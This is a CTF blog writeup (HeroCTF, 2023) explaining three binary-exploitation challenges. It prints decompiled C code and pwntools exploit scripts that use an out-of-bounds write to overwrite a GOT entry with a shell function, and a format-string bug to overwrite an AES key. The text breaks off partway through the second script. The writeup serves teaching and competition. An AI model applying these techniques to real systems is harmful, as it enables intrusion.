@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang=ko>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Finally I solved 3 pwn. (Appointment Book, Impossible v2, Rope Dancer) Personally I feel that Rope Dancer is really fun challenge! Appointment BookAnalysisIt have 2 function (create_appointment, list_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HeroCTF pwn writeup">
+<meta property="og:url" content="http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/index.html">
+<meta property="og:site_name" content="p0her">
+<meta property="og:description" content="Finally I solved 3 pwn. (Appointment Book, Impossible v2, Rope Dancer) Personally I feel that Rope Dancer is really fun challenge! Appointment BookAnalysisIt have 2 function (create_appointment, list_">
+<meta property="og:locale" content="ko_KR">
+<meta property="article:published_time" content="2023-05-15T01:09:33.000Z">
+<meta property="article:modified_time" content="2023-05-15T02:31:29.021Z">
+<meta property="article:author" content="p0her">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/mikoto.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/mikoto.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/mikoto.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>HeroCTF pwn writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/05/14/pwnable-tw-secret-of-my-heart/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&text=HeroCTF pwn writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&is_video=false&description=HeroCTF pwn writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HeroCTF pwn writeup&body=Check out this article: http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&name=HeroCTF pwn writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&t=HeroCTF pwn writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Appointment-Book"><span class="toc-number">1.</span> <span class="toc-text">Appointment Book</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impossible-v2"><span class="toc-number">2.</span> <span class="toc-text">Impossible v2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabiltiy"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerabiltiy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-1"><span class="toc-number">2.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rope-Dancer"><span class="toc-number">3.</span> <span class="toc-text">Rope Dancer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-2"><span class="toc-number">3.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabiltiy-1"><span class="toc-number">3.2.</span> <span class="toc-text">Vulnerabiltiy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-2"><span class="toc-number">3.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HeroCTF pwn writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">p0her</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-15T01:09:33.000Z" class="dt-published" itemprop="datePublished">2023-05-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Finally I solved 3 pwn. (Appointment Book, Impossible v2, Rope Dancer) Personally I feel that Rope Dancer is really fun challenge!</p>
+<h1 id="Appointment-Book"><a href="#Appointment-Book" class="headerlink" title="Appointment Book"></a>Appointment Book</h1><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>It have 2 function (<code>create_appointment</code>, <code>list_appointment</code>). you can add any timestamp value (integer type) in bss segment, and see the value.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">create_appointment</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 *v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter the index of this appointment (0-7): &quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &gt; <span class="number">7</span> );</span><br><span class="line">  v5 = (__int64 *)((<span class="type">char</span> *)&amp;appointments + <span class="number">16</span> * v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter a date and time (YYYY-MM-DD HH:MM:SS): &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">fgets</span>((<span class="type">char</span> *)s, <span class="number">30</span>, stdin);</span><br><span class="line">  v0 = <span class="built_in">date_to_timestamp</span>(s);</span><br><span class="line">  *v5 = v0;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Converted to UNIX timestamp using local timezone: %ld\n&quot;</span>, *v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter an associated message (place, people, notes...): &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">fgets</span>(v4, <span class="number">62</span>, stdin);</span><br><span class="line">  v5[<span class="number">1</span>] = (__int64)v4;</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>This function name is <code>create_appointment</code>. it do malloc two times of <code>0x20</code> size, <code>0x40</code> size and input index number. But it occurs <strong>out-of-bound</strong> vulnerability because don’t check about index. anyway, and input value of date-type (like 2022-12-23 11:12:23) and convert it to timestamp value(integer). after that, it input any string of maximum 62 size in v4.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">list_appointments</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n[+] List of appointments: &quot;</span>);</span><br><span class="line">  result = <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="type">const</span> <span class="type">char</span> **)((<span class="type">char</span> *)&amp;appointments + <span class="number">16</span> * i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- Appointment n°%d:\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ( v3[<span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="built_in">timestamp_to_date</span>((<span class="type">time_t</span>)*v3);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t- Date: %s\n&quot;</span>, v1);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t- Message: %s\n&quot;</span>, v3[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\t[NO APPOINTMENT]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>this function name is <code>list_appointment</code>. this is simple list program. not have any vulnerability.</p>
+<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>As I said earlier it occurs <strong>out-of-bound</strong> write vulnerability in <code>create_appointment</code> function. </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>So how to use this vulnerability to exploit? It have NX, Stack Canary mitigation so can got overwrite.<br>and <code>debug_remote</code> function is execute shell! so overwrite any got to <code>debug_remote</code> function.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">debug_remote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>but we can only input string value, not int value! so we convert <code>debug_remote</code> function address value to date. It is <code>1970-02-18 14:27:02</code> (0x401136), and position of appointment’s -5 index is <code>exit@got</code>. so we will use this.</p>
+<p>simple exploit xD</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;static-03.heroctf.fr&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;-5&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;1970-02-18 14:27:02&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;place&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag : <code>Hero&#123;Unch3ck3d_n3g4t1v3_1nd3x_1nt0_G0T_0v3wr1t3_g03s_brrrrrr&#125;</code></p>
+<h1 id="Impossible-v2"><a href="#Impossible-v2" class="headerlink" title="Impossible v2"></a>Impossible v2</h1><h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>we can see format string bug immediately. (sprintf)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  FILE *streama; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;I&#x27;ve implemented a 1-block AES ECB 128 cipher that uses a random key.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Try to give me a message such as AES_Encrypt(message, key) = 0xdeadbeefdeadbeefcafebabecafebabe.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(don&#x27;t try too much, this is impossible).\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  streama = <span class="built_in">fopen</span>(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="built_in">fread</span>(&amp;key, <span class="number">0x10</span>uLL, <span class="number">1uLL</span>, streama);</span><br><span class="line">  <span class="built_in">fclose</span>(streama);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your message: &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">40</span>, stdin);</span><br><span class="line">  <span class="built_in">sprintf</span>(message, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do you want to change it ? (y/n) &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  v4 = <span class="built_in">getc</span>(stdin);</span><br><span class="line">  <span class="built_in">getc</span>(stdin);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your message (last chance): &quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">fgets</span>(s, <span class="number">40</span>, stdin);</span><br><span class="line">    <span class="built_in">sprintf</span>(message, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;So, this is your final message: &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">39</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, (<span class="type">unsigned</span> __int8)message[i]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">AES_Encrypt</span>(message, &amp;key);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(message, expected, <span class="number">0x10</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WHAT ?! THIS IS IMPOSSIBLE !!!&quot;</span>);</span><br><span class="line">    stream = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">getc</span>(stream);</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">putchar</span>(v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">fclose</span>(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well, I guess you&#x27;re not this smart :)&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The concept of program is AES-encrypt. we should make <code>AES_ECB_128(our_input, key)</code> &#x3D; 0xdeadbeefdeadbeefcafebabecafebabe.</p>
+<h2 id="Vulnerabiltiy"><a href="#Vulnerabiltiy" class="headerlink" title="Vulnerabiltiy"></a>Vulnerabiltiy</h2><p>it can format string bug only two times.</p>
+<h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>The key is random via <code>/dev/urandom</code>. but we can overwrite key using format string bug, so we overwrite key to 0x0 and send AES_DECRYPT(0xdeadbeefdeadbeefcafebabecafebabe, 0x0). then can make message is 0xdeadbeefdeadbeefcafebabecafebabe.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = p64(<span class="number">0x00</span>)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">x = <span class="string">b&#x27;\xde\xad\xbe\xef\xde\xad\xbe\xef\xca\xfe\xba\xbe\xca\xfe\xba\xbe&#x27;</span></span><br><span class="line">can = (cipher.decrypt(x))</span><br><span class="line"><span class="built_in">print</span>(cipher.encrypt(can))</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./impossible_v2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./impossible_v2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">offset</span>):</span><br><span class="line">    payload = p64(<span class="number">0x4004c0</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;message: &#x27;</span>, payload)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;(y/n) &#x27;</span>, <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;message: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(r.recvline().decode())</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;message: &#x27;</span>, <span 